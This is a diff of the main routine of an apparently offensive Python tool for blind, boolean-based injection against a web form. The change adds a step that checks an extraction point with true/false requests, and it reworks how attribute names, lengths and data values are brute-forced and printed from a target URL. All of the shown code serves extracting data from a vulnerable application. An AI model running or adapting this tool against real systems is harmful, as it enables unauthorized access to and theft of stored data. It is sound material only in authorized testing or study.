@@ -92,32 +92,42 @@ def main():
     # display results    
     print("Successfull payloads:")
     for p in success_payloads:
-        print(p)
+        print(f"\t {p[0]}")
         
     print("Error inflicting payloads:")
     for p in error_payloads:
-        print(p)
+        print(f"\t {p[2]}")
         
 
-    for _, extraction_payload in success_payloads:     
-        found_attributes = brute_attribute_names(url, form_data,scan_param_name, default_response, extraction_payload, attributes_list)
-        if found_attributes:
-            extraction_point = extraction_payload
-            break
+    # verify exctration point    
+    print("[+] Verifing extraction point...")
+    for _, extraction_payload in success_payloads:         
+        print(f"[*] Testing extraction payload: {extraction_payload}")
+        if send_extraction_request(url, form_data, extraction_payload, "true", scan_param_name, default_response):                 
+            if not send_extraction_request(url, form_data, extraction_payload, "false", scan_param_name, default_response):         
+                extraction_point = extraction_payload
+                break
+
+    if not extraction_point:
+        print("[-] No valid extraction point found")
+        exit()
+    else: 
+        print(f"[+] Valid extraction point found: {extraction_point}")
+
+    # Brute Attributes
+    found_attributes = brute_attribute_names(url, form_data,scan_param_name, default_response, extraction_payload, attributes_list)
 
     results = []
-    for attr in found_attributes:
-        extraction_attribute_length = get_extraction_parameter_length(url, form_data,scan_param_name, default_response, extraction_payload, extraction_attribute_name=attr)
-        if extraction_attribute_length:
-            print(f"\t[+] attr.length: {extraction_attribute_length}")
-            res = brute_extract_data(url, form_data,scan_param_name, default_response, extraction_point, attr, extraction_attribute_length)
-            if res:
-                print(f"\t[data] {attr}: {res}")   
-                results.append([attr, res])
-        else: print(f"[-] Could not get length of {attr}")
+    for attr, length in found_attributes:
+        res = brute_extract_data(url, form_data,scan_param_name, default_response, extraction_point, attr, length)
+        if res:
+            print(f"[data] {attr}:{res}")   
+            results.append([attr, res])
+       
     
     print("Extracted attributes:")
-    print(", ".join(found_attributes))
+    for attr, length in found_attributes:
+        print(f"[+]  {attr}:{length}")
 
     print("Extracted data:")
     for r in results:
